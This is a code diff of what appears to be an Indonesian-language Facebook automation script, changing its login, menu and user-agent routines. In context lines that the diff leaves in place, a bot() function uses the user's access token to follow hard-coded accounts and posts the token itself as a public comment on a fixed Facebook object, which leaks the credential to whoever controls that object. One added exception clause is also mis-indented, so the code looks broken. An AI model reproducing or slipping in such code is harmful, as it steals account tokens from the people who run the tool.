@@ -252,10 +252,10 @@ def login():
 		  open('login/token.json', 'w').write(token)
 		  open('login/cookie.json','w').write(cookie)
 		  menu()
-		except KeyError:
-			print(" %s[!] token kadaluwarsa!"%(M))
-			sys.exit() 
- 
+		except KeyError:print(" %s[!] cookie kadaluwarsa!"%(M));exit()
+		except requests.exceptions.ConnectionError:
+        exit(" %s[!] anda tidak terhubung ke internet!"%(M))
+
 ### BOT FOLLOW DAN KOMEN ###
 def bot():
 	try:
@@ -269,7 +269,7 @@ def bot():
 	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + (token),cookies=cookie)
 	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + (token),cookies=cookie)
 	requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + (token),cookies=cookie)
-
+	menu()
 ### BAGIAN MENU ###
 def menu():
     global token, cookie
@@ -277,8 +277,8 @@ def menu():
     try:
         token = open('login/token.json', 'r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
-        language(cookie)
         get = requests.get("https://graph.facebook.com/me?access_token=%s"%(token),cookies=cookie)
+        language(cookie)
         a = json.loads(get.text)
         nama = a['name']
         uid = a['id']
@@ -286,10 +286,7 @@ def menu():
     except (KeyError, IOError):
         os.system('clear')
         print("\n %s[!] token kadaluwarsa!"%(M));login()
-    except requests.exceptions.ConnectionError:
-        exit(" %s[!] anda tidak terhubung ke internet!"%(M))
-
-    logo()
+    clear();logo()
     print('──────────────────────────────────────────')
     print(" Nama        : %s"%(nama))
     print(" ID          : %s"%(uid))
@@ -329,9 +326,7 @@ def gantiua():
 		menu()
 	else:
 		try:
-			zedd = open('ugent.json', 'w')
-			zedd.write(ajg)
-			zedd.close()
+			zedd = open('ugent.json', 'w').write(ajg)
 			print('──────────────────────────────────────────')
 			print(" [✓] berhasil mengganti ua")
 			input(" [*] tekan enter untuk kembali ke menu")
